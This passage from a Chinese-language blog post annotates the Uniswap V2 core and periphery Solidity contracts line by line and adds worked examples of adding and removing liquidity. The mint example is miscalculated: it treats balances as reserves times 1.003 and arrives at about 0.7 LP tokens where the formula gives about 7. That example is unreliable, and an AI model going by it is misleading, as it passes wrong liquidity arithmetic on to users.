literacy","slug":"Knowledge-literacy","permalink":"https://biyouqiuqiu.com/tags/Knowledge-literacy/"},{"name":"Proxy","slug":"Proxy","permalink":"https://biyouqiuqiu.com/tags/Proxy/"},{"name":"Transparent","slug":"Transparent","permalink":"https://biyouqiuqiu.com/tags/Transparent/"}]},{"title":"uniswap v2","slug":"Knowledge literacy/uniswap/uniswap-v2","date":"2023-07-17T05:47:10.000Z","updated":"2023-07-17T05:47:10.000Z","comments":true,"path":"2023/07/17/Knowledge literacy/uniswap/uniswap-v2/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/17/Knowledge%20literacy/uniswap/uniswap-v2/","excerpt":"","text":"前言：Uniswap V2代码结构 Uniswap智能合约代码由两个github项目组成。一个是core，一个是periphery。 https://github.com/Uniswap/uniswap-v2-core.git https://github.com/Uniswap/uniswap-v2-periphery.git core偏核心逻辑，单个swap的逻辑。periphery偏外围服务，一个个swap的基础上构建服务。单个swap，两种代币形成的交易对，俗称“池子”。每个交易对有一些基本属性：reserve0&#x2F;reserve1以及total supply。reserve0&#x2F;reserve1是交易对的两种代币的储存量。total supply是当前流动性代币的总量。每个交易对都对应一个流动性代币（LPT - liquidity provider token）。简单的说，LPT记录了所有流动性提供者的贡献。所有流动性代币的总和就是total supply。Uniswap协议的思想是reserve0*reserve1的乘积不变。 Periphery逻辑 核心逻辑实现在UniswapV2Router02.sol中。称为Router，因为Periphery实现了“路由”，支持各个swap之间的连接。基本上实现了三个功能：1&#x2F; add liquidity（增加流动性）2&#x2F;remove liqudity (抽取流动性) 3&#x2F; swap（交换）。 uniswap v2非常重要，必须要非常熟悉该协议！！！ 以下便是对uniswap v2 代码的解读。 v2-core1. UniswapV2ERC20uniswap v2的代币实际上是 ERC20代币。实现ERC20标准方法。 代码解读如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148pragma solidity =0.5.16;import &#x27;./interfaces/IUniswapV2ERC20.sol&#x27;;import &#x27;./libraries/SafeMath.sol&#x27;;contract UniswapV2ERC20 is IUniswapV2ERC20 &#123; using SafeMath for uint; // 将 SafeMath 库合约用于 uint 类型 string public constant name = &#x27;Uniswap V2&#x27;; // 代币的名字 string public constant symbol = &#x27;UNI-V2&#x27;; // 代币符号 uint8 public constant decimals = 18; uint public totalSupply; // 发行量 // 存储某地址的代币余额，address =&gt; uint的映射 mapping(address =&gt; uint) public balanceOf; // 存储某一地址对另一地址的代币授权量，授权之后可以允许被授权人使用授权人的代币进行转账 `transferFrom` mapping(address =&gt; mapping(address =&gt; uint)) public allowance; // bytes32 public DOMAIN_SEPARATOR; // keccak256(&quot;Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)&quot;); bytes32 public constant PERMIT_TYPEHASH = 0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9; // mapping(address =&gt; uint) public nonces; // 两个在授权和转账时会被触发的事件 event Approval(address indexed owner, address indexed spender, uint value); event Transfer(address indexed from, address indexed to, uint value); constructor() public &#123; uint chainId; assembly &#123; // chainid指令用于获取当前区块链的链ID, 它唯一地标识了当前区块链的网络 chainId := chainid &#125; // 初始化 DOMAIN_SEPARATOR 变量 DOMAIN_SEPARATOR = keccak256( abi.encode( keccak256(&#x27;EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)&#x27;), keccak256(bytes(name)), keccak256(bytes(&#x27;1&#x27;)), chainId, address(this) ) ); &#125; /** 1. 铸币操作，因为有库函数的引用，可以直接调用 add,sub等运算 2. totalSupply 发行量时对于整个系统来说，而balance是对于某个账户来说 */ function _mint(address to, uint value) internal &#123; totalSupply = totalSupply.add(value); // 发行量累加 value balanceOf[to] = balanceOf[to].add(value); // to账户的 余额累加 value emit Transfer(address(0), to, value); // 触发交易事件 &#125; /** 1. 销币操作 */ function _burn(address from, uint value) internal &#123; balanceOf[from] = balanceOf[from].sub(value); // from 账户的 余额累减 value totalSupply = totalSupply.sub(value); // 发行量累减 value emit Transfer(from, address(0), value); // 触发交易事件 &#125; /** 1. 授权操作 2. owner一般是调用者，spender则是授权者，value是授权代币量 */ function _approve(address owner, address spender, uint value) private &#123; // 记录owner 对spender 的授权量为 value allowance[owner][spender] = value; emit Approval(owner, spender, value); // 触发授权事件 &#125; /** 1. 转账操作 2. 内置函数_transfer(), from账户向to账户转移 value的代币 3. 而在外部函数中，transfer中的from为合约调用者 */ function _transfer(address from, address to, uint value) private &#123; // from 账户余额减少value balanceOf[from] = balanceOf[from].sub(value); // to 账户余额增加 value balanceOf[to] = balanceOf[to].add(value); emit Transfer(from, to, value); &#125; /** 1. 外部授权操作 2. 外部授权规定了授权者是调用者，予以：&#x27;我&#x27;给spender授权 */ function approve(address spender, uint value) external returns (bool) &#123; _approve(msg.sender, spender, value); return true; &#125; /** 1. 外部转账操作 2. 规定了转账者是调用者，予以：&#x27;我&#x27;给to转账value */ function transfer(address to, uint value) external returns (bool) &#123; _transfer(msg.sender, to, value); return true; &#125; /** 1. 外部转账操作，msg.sender是代理人 2. 在 pragma=0.5.16的版本中，uint(-1)= 115792089237316195423570985008687907853269984665640564039457584007913129639935 3. 要调用该函数，事先要让 from执行approve函数，给msg.sender授权 4. 最后调用_transfer()函数，执行from 向 to 转账 value的操作 */ function transferFrom(address from, address to, uint value) external returns (bool) &#123; if (allowance[from][msg.sender] != uint(-1)) &#123; allowance[from][msg.sender] = allowance[from][msg.sender].sub(value); &#125; _transfer(from, to, value); return true; &#125; /** 1. 许可操作 2. permit函数的作用是将代币授权给指定的目标地址， 使得目标地址可以代表代币持有人进行交易，而无需进行传统的授权交易。 这种新型的授权方法可以提高代币交易的效率和安全性， 同时也可以减少交易的成本和时间。 3. owner授权者，spender被授权者，value代币数目，deadline：授权的截止时间，必须在此时间之前完成授权 nonce：随机数，用于避免授权被重复使用，v、r、s：用于验证授权的签名参数。 */ function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external &#123; require(deadline &gt;= block.timestamp, &#x27;UniswapV2: EXPIRED&#x27;); bytes32 digest = keccak256( abi.encodePacked( &#x27;\\x19\\x01&#x27;, DOMAIN_SEPARATOR, keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, nonces[owner]++, deadline)) ) ); address recoveredAddress = ecrecover(digest, v, r, s); require(recoveredAddress != address(0) &amp;&amp; recoveredAddress == owner, &#x27;UniswapV2: INVALID_SIGNATURE&#x27;); _approve(owner, spender, value); &#125;&#125; 2. UniswapV2Factory工厂合约，用于创建Pair合约（以及设置协议手续费接收地址） 代码解读如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182pragma solidity =0.5.16;import &#x27;./interfaces/IUniswapV2Factory.sol&#x27;;import &#x27;./UniswapV2Pair.sol&#x27;;contract UniswapV2Factory is IUniswapV2Factory &#123; address public feeTo; // 手续费接收地址 address public feeToSetter; // 手续费接收地址的设置者 /** 如果将 getPair设置为public，则编译的时候会在该合约中默认生成set 和get函数 解读：通过两个地址获取到交易对地址 */ mapping(address =&gt; mapping(address =&gt; address)) public getPair; // 数组，存储所有交易对 address[] public allPairs; // 交易对创建事件 event PairCreated(address indexed token0, address indexed token1, address pair, uint); // 初始化，手续费接收地址的设置者 constructor(address _feeToSetter) public &#123; feeToSetter = _feeToSetter; &#125; // 获取交易对的对数 function allPairsLength() external view returns (uint) &#123; return allPairs.length; &#125; /** 首先将token0 token1按照顺序排序，确保token0字面地址小于token1。 接着使用assembly + create2创建合约。 assembly可以在Solidity中使用Yul语言直接操作EVM，是较底层的操作方法。 《Uniswap v2 白皮书》中讲到，create2主要用于创建确定性的交易对合约地址， 目的是根据两个代币地址直接计算pair地址，而无需调用链上合约查询。 */ function createPair(address tokenA, address tokenB) external returns (address pair) &#123; // 两种代币地址不能相同 require(tokenA != tokenB, &#x27;UniswapV2: IDENTICAL_ADDRESSES&#x27;); // 先将token0 token1按照顺序排序，确保token0字面地址小于token1 (address token0, address token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA); // 确保token0不等于 address(0)，则两个地址都不为 address(0) require(token0 != address(0), &#x27;UniswapV2: ZERO_ADDRESS&#x27;); // 确保这两种代币地址的交易对为address(0),即这两个代币尚未创建交易对 require(getPair[token0][token1] == address(0), &#x27;UniswapV2: PAIR_EXISTS&#x27;); // single check is sufficient // 获取 `UniswapV2Pair`的字节码 bytes memory bytecode = type(UniswapV2Pair).creationCode; // 生成盐salt，salt由这两个地址紧打包再hash获得，是唯一的 bytes32 salt = keccak256(abi.encodePacked(token0, token1)); // 通过creat2计算交易对地址 assembly &#123; pair := create2(0, add(bytecode, 32), mload(bytecode), salt) &#125; // 将新生成的交易对中的两种代币设置为 token0, token1 IUniswapV2Pair(pair).initialize(token0, token1); // 记录token0 和 token1生成的交易对 getPair[token0][token1] = pair; // 反向填充映射 getPair[token1][token0] = pair; // populate mapping in the reverse direction // 保存该交易对pair allPairs.push(pair); // 创建成功，触发交易对生成事件 emit PairCreated(token0, token1, pair, allPairs.length); &#125; // 设置手续费接收地址 function setFeeTo(address _feeTo) external &#123; require(msg.sender == feeToSetter, &#x27;UniswapV2: FORBIDDEN&#x27;); feeTo = _feeTo; &#125; // 修改手续费接收地址的设置者 function setFeeToSetter(address _feeToSetter) external &#123; require(msg.sender == feeToSetter, &#x27;UniswapV2: FORBIDDEN&#x27;); feeToSetter = _feeToSetter; &#125;&#125; 3. UniswapV2Pair Pair（交易对）合约，定义和交易有关的几个最基础方法，如swap&#x2F;mint&#x2F;burn，价格预言机等功能，其本身是一个ERC20合约，继承UniswapV2ERC20 Pair合约主要实现了三个方法：mint（添加流动性）、burn（移除流动性）、swap（兑换）。 代码解读如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268pragma solidity =0.5.16;import &#x27;./interfaces/IUniswapV2Pair.sol&#x27;;import &#x27;./UniswapV2ERC20.sol&#x27;;import &#x27;./libraries/Math.sol&#x27;;import &#x27;./libraries/UQ112x112.sol&#x27;;import &#x27;./interfaces/IERC20.sol&#x27;;import &#x27;./interfaces/IUniswapV2Factory.sol&#x27;;import &#x27;./interfaces/IUniswapV2Callee.sol&#x27;;contract UniswapV2Pair is IUniswapV2Pair, UniswapV2ERC20 &#123; // 引用库函数 using SafeMath for uint; using UQ112x112 for uint224; // 最低额度的流动性 uint public constant MINIMUM_LIQUIDITY = 10**3; // tansfer函数的选择器 bytes4 private constant SELECTOR = bytes4(keccak256(bytes(&#x27;transfer(address,uint256)&#x27;))); // 工厂？token0和token1交易对中的两种代币 address public factory; address public token0; address public token1; // token0和token1交易对中的两种代币的存储量 uint112 private reserve0; // uses single storage slot, accessible via getReserves uint112 private reserve1; // uses single storage slot, accessible via getReserves // 上次更新的时间 uint32 private blockTimestampLast; // uses single storage slot, accessible via getReserves // 累加交易价格 uint public price0CumulativeLast; uint public price1CumulativeLast; uint public kLast; // reserve0 * reserve1, as of immediately after the most recent liquidity event // 锁标志 uint private unlocked = 1; // 修饰器为了防止异步 modifier lock() &#123; require(unlocked == 1, &#x27;UniswapV2: LOCKED&#x27;); unlocked = 0; _; unlocked = 1; &#125; // 读取交易对中两种代币的余额，以及上一次交易对更新的时间 function getReserves() public view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast) &#123; _reserve0 = reserve0; _reserve1 = reserve1; _blockTimestampLast = blockTimestampLast; &#125; /** 1. 通过call的方式，调用token中的 transfer 函数---兼容性更强 2. 判断调用是否成功，success是否为true，data是否为空 */ function _safeTransfer(address token, address to, uint value) private &#123; (bool success, bytes memory data) = token.call(abi.encodeWithSelector(SELECTOR, to, value)); require(success &amp;&amp; (data.length == 0 || abi.decode(data, (bool))), &#x27;UniswapV2: TRANSFER_FAILED&#x27;); &#125; event Mint(address indexed sender, uint amount0, uint amount1); event Burn(address indexed sender, uint amount0, uint amount1, address indexed to); event Swap( address indexed sender, uint amount0In, uint amount1In, uint amount0Out, uint amount1Out, address indexed to ); event Sync(uint112 reserve0, uint112 reserve1); // 初始化 工厂地址为调用者 constructor() public &#123; factory = msg.sender; &#125; // called once by the factory at time of deployment // 初始化交易对中的两种代币地址 function initialize(address _token0, address _token1) external &#123; require(msg.sender == factory, &#x27;UniswapV2: FORBIDDEN&#x27;); // sufficient check token0 = _token0; token1 = _token1; &#125; // update reserves and, on the first call per block, price accumulators function _update(uint balance0, uint balance1, uint112 _reserve0, uint112 _reserve1) private &#123; require(balance0 &lt;= uint112(-1) &amp;&amp; balance1 &lt;= uint112(-1), &#x27;UniswapV2: OVERFLOW&#x27;); // 记录当前更新时间 uint32 blockTimestamp = uint32(block.timestamp % 2**32); // 记录过去了多久 uint32 timeElapsed = blockTimestamp - blockTimestampLast; // overflow is desired // 计算出当前的交易价格 if (timeElapsed &gt; 0 &amp;&amp; _reserve0 != 0 &amp;&amp; _reserve1 != 0) &#123; // * never overflows, and + overflow is desired price0CumulativeLast += uint(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) * timeElapsed; price1CumulativeLast += uint(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) * timeElapsed; &#125; // 将这两种代币的存储量设置为代币的余额 reserve0 = uint112(balance0); reserve1 = uint112(balance1); // 更新当前操作时间 blockTimestampLast = blockTimestamp; // 触发同步事件 emit Sync(reserve0, reserve1); &#125; // if fee is on, mint liquidity equivalent to 1/6th of the growth in sqrt(k) // 计算铸币手续费 function _mintFee(uint112 _reserve0, uint112 _reserve1) private returns (bool feeOn) &#123; address feeTo = IUniswapV2Factory(factory).feeTo(); // 获取当前factory铸币手续费的接收地址 feeOn = feeTo != address(0); // 检查该factory是否设置了手续费接收地址 uint _kLast = kLast; // gas savings if (feeOn) &#123; // 如果该factory有手续费接收地址 if (_kLast != 0) &#123; uint rootK = Math.sqrt(uint(_reserve0).mul(_reserve1)); uint rootKLast = Math.sqrt(_kLast); if (rootK &gt; rootKLast) &#123; uint numerator = totalSupply.mul(rootK.sub(rootKLast)); uint denominator = rootK.mul(5).add(rootKLast); uint liquidity = numerator / denominator; if (liquidity &gt; 0) _mint(feeTo, liquidity); // 给feeTo地址铸币liquidity &#125; &#125; &#125; else if (_kLast != 0) &#123; kLast = 0; &#125; &#125; // this low-level function should be called from a contract which performs important safety checks // 铸币操作，添加流动性 function mint(address to) external lock returns (uint liquidity) &#123; // 读取代币的存储量 (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings // 获取这两种代币的余额 uint balance0 = IERC20(token0).balanceOf(address(this)); uint balance1 = IERC20(token1).balanceOf(address(this)); // 计算当前合约中两个代币的净增量，并赋值给amount0和amount1变量 // 净增量等于余额减去储备量 uint amount0 = balance0.sub(_reserve0); uint amount1 = balance1.sub(_reserve1); // 调用_mintFee函数，计算是否需要收取协议手续费，并返回一个布尔值，赋值给feeOn变量 bool feeOn = _mintFee(_reserve0, _reserve1); // 理解为支付完铸币费用 // 记录发行量，难道这里也讲究异步的现象？ uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee // 如果是首次提供该交易对的流动性，则根据根号xy生成流动性代币，并销毁其中的MINIMUM_LIQUIDITY（即1000wei if (_totalSupply == 0) &#123; // 计算流动性代币的数量，等于两个代币净增量乘积的平方根减去最小流动性常量，并赋值给liquidity变量 liquidity = Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY); // 调用_mint函数，向零地址铸造最小流动性常量数量的流动性代币（永久锁定） _mint(address(0), MINIMUM_LIQUIDITY); // permanently lock the first MINIMUM_LIQUIDITY tokens &#125; else &#123; // 计算流动性代币的数量，等于两个代币净增量与储备量比例乘积与总供应量乘积的较小值，并赋值给liquidity变量 liquidity = Math.min(amount0.mul(_totalSupply) / _reserve0, amount1.mul(_totalSupply) / _reserve1); &#125; require(liquidity &gt; 0, &#x27;UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED&#x27;); _mint(to, liquidity); // 为to铸币，liquidity _update(balance0, balance1, _reserve0, _reserve1); // 调用_update函数，更新当前合约中两个代币的储备量为最新的余额 if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date emit Mint(msg.sender, amount0, amount1); &#125; // this low-level function should be called from a contract which performs important safety checks // 销币操作，移除流动性 function burn(address to) external lock returns (uint amount0, uint amount1) &#123; (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings address _token0 = token0; // gas savings address _token1 = token1; // gas savings uint balance0 = IERC20(_token0).balanceOf(address(this)); uint balance1 = IERC20(_token1).balanceOf(address(this)); uint liquidity = balanceOf[address(this)]; // 参考白皮书，为了节省交易手续费，Uniswap v2只在mint/burn流动性时收取累计的协议手续费。 bool feeOn = _mintFee(_reserve0, _reserve1); uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee // 采用mint中计算 liquidity的方法倒推amount amount0 = liquidity.mul(balance0) / _totalSupply; // using balances ensures pro-rata distribution amount1 = liquidity.mul(balance1) / _totalSupply; // using balances ensures pro-rata distribution require(amount0 &gt; 0 &amp;&amp; amount1 &gt; 0, &#x27;UniswapV2: INSUFFICIENT_LIQUIDITY_BURNED&#x27;); // 销毁本合约的 流动性 liquidity _burn(address(this), liquidity); // 调用_token0(_token1)中的 transfer函数 // 通过各自token中实现的transfer将token转移回to _safeTransfer(_token0, to, amount0); _safeTransfer(_token1, to, amount1); //更新合约自身的token0、1余额 balance0 = IERC20(_token0).balanceOf(address(this)); balance1 = IERC20(_token1).balanceOf(address(this)); //更新池子中的储备量和价格积累器 _update(balance0, balance1, _reserve0, _reserve1); if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date emit Burn(msg.sender, amount0, amount1, to); &#125; // this low-level function should be called from a contract which performs important safety checks /** 实现两种代币的交换（交易）功能-----闪电贷功能 uint amount0Out：要转换的第一种代币的数量。 uint amount1Out：要转换的第二种代币的数量。 address to：接收转换后代币的目标地址。 bytes data：可选的额外数据，用于向目标地址提供更多信息。 */ // 接收者 to 必须要实现 `uniswapV2Call`函数，通过此函数输入交换的代币 function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external lock &#123; require(amount0Out &gt; 0 || amount1Out &gt; 0, &#x27;UniswapV2: INSUFFICIENT_OUTPUT_AMOUNT&#x27;); (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings // 检查输出量是否小于储备量 require(amount0Out &lt; _reserve0 &amp;&amp; amount1Out &lt; _reserve1, &#x27;UniswapV2: INSUFFICIENT_LIQUIDITY&#x27;); uint balance0; uint balance1; &#123; // scope for _token&#123;0,1&#125;, avoids stack too deep errors address _token0 = token0; address _token1 = token1; // 检查接收地址是否合法 require(to != _token0 &amp;&amp; to != _token1, &#x27;UniswapV2: INVALID_TO&#x27;); if (amount0Out &gt; 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens if (amount1Out &gt; 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens // 如果有额外数据，就调用接收地址的回调函数 if (data.length &gt; 0) IUniswapV2Callee(to).uniswapV2Call(msg.sender, amount0Out, amount1Out, data); balance0 = IERC20(_token0).balanceOf(address(this)); balance1 = IERC20(_token1).balanceOf(address(this)); &#125; // 计算输入量 uint amount0In = balance0 &gt; _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0; uint amount1In = balance1 &gt; _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0; require(amount0In &gt; 0 || amount1In &gt; 0, &#x27;UniswapV2: INSUFFICIENT_INPUT_AMOUNT&#x27;); &#123; // scope for reserve&#123;0,1&#125;Adjusted, avoids stack too deep errors // 计算调整后的余额，因为在solidity中没有浮点数 0.3%，这样是为了模拟出 0.3% uint balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(3)); uint balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(3)); require(balance0Adjusted.mul(balance1Adjusted) &gt;= uint(_reserve0).mul(_reserve1).mul(1000**2), &#x27;UniswapV2: K&#x27;); &#125; _update(balance0, balance1, _reserve0, _reserve1); emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to); &#125; // force balances to match reserves /** 用于移除资金池中多余代币的函数。它的作用是将代币池中多余的代币转移到指定的目标地址，以便于在资金池中保持正确的代币比例 */ function skim(address to) external lock &#123; address _token0 = token0; // gas savings address _token1 = token1; // gas savings _safeTransfer(_token0, to, IERC20(_token0).balanceOf(address(this)).sub(reserve0)); _safeTransfer(_token1, to, IERC20(_token1).balanceOf(address(this)).sub(reserve1)); &#125; // force reserves to match balances // 同步，迫使代币余额与代币储量相匹配，调用_update函数 function sync() external lock &#123; _update(IERC20(token0).balanceOf(address(this)), IERC20(token1).balanceOf(address(this)), reserve0, reserve1); &#125;&#125; 分析 mint函数，举例 假设有一个流动性池，其中有 10 个 ETH 和 5000 个 USDC，总供应量为 70.71 个流动性代币（这里面包括过去交易留下的Fees）。现在，有人想向这个池中添加 1 个 ETH 和 500 个 USDC，以获得更多的流动性代币。那么，他们将获得多少流动性代币呢？ 首先，我们需要计算添加后的两种代币的储备量和余额。储备量等于原来的储备量加上添加的数量，余额等于储备量加上协议手续费（假设为 0.3%）。因此，我们有： 储备量：reserve0 &#x3D; 10 + 1 &#x3D; 11 ETH，reserve1 &#x3D; 5000 + 500 &#x3D; 5500 USDC 余额：balance0 &#x3D; reserve0 * (1 + 0.003) &#x3D; 11.033 ETH，balance1 &#x3D; reserve1 * (1 + 0.003) &#x3D; 5516.5 USDC 接下来，我们需要计算添加后的总供应量。如果是第一次添加流动性，则使用公式 sqrt(x * y) — MINIMUM_LIQUIDITY，否则使用公式 min(x * totalSupply &#x2F; reserve0, y * totalSupply &#x2F; reserve1)。因为这不是第一次添加流动性，所以我们使用后者。因此，我们有： 总供应量：totalSupply &#x3D; min(balance0 * 70.71 &#x2F; reserve0, balance1 * 70.71 &#x2F; reserve1) &#x3D; min(71.41, 71.41) &#x3D; 71.41 最后，我们需要计算添加者获得的流动性代币的数量。这个数量等于添加后的总供应量减去添加前的总供应量。因此，我们有： 流动性代币：liquidity &#x3D; totalSupply — 70.71 &#x3D; 71.41–70.71 &#x3D; 0.7 也就是说，添加者将获得大约 0.7 个流动性代币。 分析burn,举例 假设有一个池子，它允许交易 ETH 和 DAI，它的地址是 0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11。这个池子有以下的状态： 流动性代币的总供应量是 3,000,000。 池子里有 10,000 个 ETH 和 4,000,000 个 DAI。 协议费用是 0.05%。 你拥有 30,000 个流动性代币，也就是池子的 1%。 现在，你想要退出这个池子，把你的流动性代币销毁，并拿回你的 ETH 和 DAI。你可以调用这个函数，把 to 参数设为你自己的地址。这样，函数会做以下的事情： 它会从池子里获取 ETH 和 DAI 的储备量，分别是 _reserve0 = 10,000 和 _reserve1 = 4,000,000。 它会获取 ETH 和 DAI 的地址，分别是 _token0 = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2 和 _token1 = 0x6B175474E89094C44Da98b954EedeAC495271d0F。 它会获取合约自身的 ETH 和 DAI 的余额，分别是 balance0 = 10,000 和 balance1 = 4,000,000。注意，这里假设没有其他人在同一区块内与池子交互，否则余额可能会有变化。 它会获取合约自身的流动性代币余额，也就是 liquidity = 30,000。 它会调用 _mintFee 函数，来分发协议费用给流动性提供者。假设在你加入池子后，没有发生过任何交易，那么协议费用就是零，所以 _mintFee 函数不会改变任何东西，并返回 feeOn = false。 它会计算你能够拿回的 ETH 和 DAI 的数量，分别是 amount0 = liquidity * balance0 / totalSupply = 30,000 * 10,000 / 3,000,000 = 100 和 amount1 = liquidity * balance1 / totalSupply = 30,000 * 4,000,000 / 3,000,000 = 40,000。这保证了按比例分配。 知识点： abi.decode(data, (bool))是Solidity中的一种函数调用，用于将字节数组（byte array）解码为布尔值（bool）类型。 具体来说，abi.decode函数接受两个参数：字节数组和数据类型。在这里，字节数组是要解码的数据，数据类型是要解码成的目标类型，即布尔值。 函数调用abi.decode(data, (bool))将字节数组解码为一个布尔值。这个布尔值的值取决于字节数组中的数据。如果字节数组中的数据为0，则解码后的布尔值为false，否则为true。 知识点： UQ112x112.encode(_reserve1).uqdiv(_reserve0) UQ112x112.encode(_reserve1).uqdiv(_reserve0)是Uniswap V2中的一个计算交易价格的操作，使用了UQ112x112固定点数算法。 具体来说，_reserve0和_reserve1是Uniswap V2交易对中两种资产的余额（reserve），UQ112x112.encode()函数将余额编码为UQ112x112固定点数格式，然后使用了.uqdiv()函数对两种资产的余额进行了除法操作，计算出当前的交易价格。 UQ112x112固定点数算法是一种用于在以太坊合约中进行精确数学计算的算法。它将浮点数转换为整数，并使用固定的小数位数进行计算。在Uniswap V2中，UQ112x112固定点数算法被广泛应用于计算交易价格和资金池分配等。 在这个操作中，UQ112x112.encode(_reserve1)将_reserve1编码为UQ112x112格式，然后.uqdiv(_reserve0)将编码后的_reserve1除以_reserve0。最终的结果是一个UQ112x112格式的数，表示当前的交易价格。 v2-periphery1. UniswapV2Router02123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524pragma solidity =0.6.6;import &#x27;@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol&#x27;;import &#x27;@uniswap/lib/contracts/libraries/TransferHelper.sol&#x27;;import &#x27;./interfaces/IUniswapV2Router02.sol&#x27;;import &#x27;./libraries/UniswapV2Library.sol&#x27;;import &#x27;./libraries/SafeMath.sol&#x27;;import &#x27;./interfaces/IERC20.sol&#x27;;import &#x27;./interfaces/IWETH.sol&#x27;;contract UniswapV2Router02 is IUniswapV2Router02 &#123; using SafeMath for uint; address public immutable override factory; address public immutable override WETH; // 修饰器确保 操作在截止日期之前 modifier ensure(uint deadline) &#123; require(deadline &gt;= block.timestamp, &#x27;UniswapV2Router: EXPIRED&#x27;); _; &#125; // 初始化factory 和 WETH地址 constructor(address _factory, address _WETH) public &#123; factory = _factory; WETH = _WETH; &#125; // 接收ETH receive() external payable &#123; assert(msg.sender == WETH); // only accept ETH via fallback from the WETH contract &#125; // **** ADD LIQUIDITY **** /** _addLiquidity可以帮助计算最佳汇率。如果是首次添加流动性，则会先创建交易对合约； 否则根据当前池子余额计算应该注入的最佳代币数量。 */ function _addLiquidity( address tokenA, // 代币A address tokenB, // 代币B uint amountADesired, // 希望存入的代币A数量 uint amountBDesired, // 希望存入的代币B数量 uint amountAMin, // 最少存入的代币A数量 uint amountBMin // 最少存入的代币B数量 ) internal virtual returns (uint amountA, uint amountB) &#123; // create the pair if it doesn&#x27;t exist yet if (IUniswapV2Factory(factory).getPair(tokenA, tokenB) == address(0)) &#123; IUniswapV2Factory(factory).createPair(tokenA, tokenB); &#125; // 获取交易对中代币A B的存储量 (uint reserveA, uint reserveB) = UniswapV2Library.getReserves(factory, tokenA, tokenB); // 如果储备量都为 0，那两个预期支付额就是成交量 if (reserveA == 0 &amp;&amp; reserveB == 0) &#123; (amountA, amountB) = (amountADesired, amountBDesired); &#125; else &#123; // 采用控制变量法算出最佳的汇率 /** 如果计算得出的结果值 amountBOptimal 不比 amountBDesired 大，且不会小于 amountBMin， 就可将 amountADesired 和该 amountBOptimal 作为结果值返回。 如果 amountBOptimal 大于 amountBDesired，则根据 amountBDesired 计算得出需要支付多少 tokenA， 得到 amountAOptimal，只要 amountAOptimal 不大于 amountADesired 且不会小于 amountAMin， 就可将 amountAOptimal 和 amountBDesired 作为结果值返回。 */ // 调用quote函数，换算amountADesired 对应的B代币为多少 uint amountBOptimal = UniswapV2Library.quote(amountADesired, reserveA, reserveB); // 最佳的B代币数量少于希望存入的代币B数量 if (amountBOptimal &lt;= amountBDesired) &#123; // 这是定 amountADesired，求B的最佳数量 // 而且最佳B代币数量要求 &gt;= amountBMin require(amountBOptimal &gt;= amountBMin, &#x27;UniswapV2Router: INSUFFICIENT_B_AMOUNT&#x27;); // 返回希望存入的A，和最佳的B数量 (amountA, amountB) = (amountADesired, amountBOptimal); &#125; else &#123; // 定amountBDesired，求A的最佳数量 // 调用quote函数，换算amountBDesired 对应的A代币为多少 uint amountAOptimal = UniswapV2Library.quote(amountBDesired, reserveB, reserveA); assert(amountAOptimal &lt;= amountADesired); require(amountAOptimal &gt;= amountAMin, &#x27;UniswapV2Router: INSUFFICIENT_A_AMOUNT&#x27;); // 返回希望存入的B，和最佳的A数量 